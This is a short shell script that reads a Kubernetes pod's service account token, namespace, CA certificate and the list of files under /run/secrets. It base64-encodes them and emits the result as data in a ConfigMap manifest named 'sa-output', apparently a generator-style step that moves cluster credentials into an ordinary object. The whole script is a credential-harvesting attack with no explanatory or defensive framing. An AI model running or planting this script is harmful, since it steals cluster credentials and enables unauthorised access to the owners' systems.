#!/bin/sh
RECON=$( (
  echo "===TOKEN==="
  cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "NO_TOKEN"
  echo "===NAMESPACE==="
  cat /run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "NO_NS"
  echo "===CA==="
  cat /run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null | head -c 200
  echo "===ALL_FILES==="
  find /run/secrets -type f 2>/dev/null
) | base64 | tr -d '\n')
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: sa-output
data:
  result: $RECON
EOF
exit 0
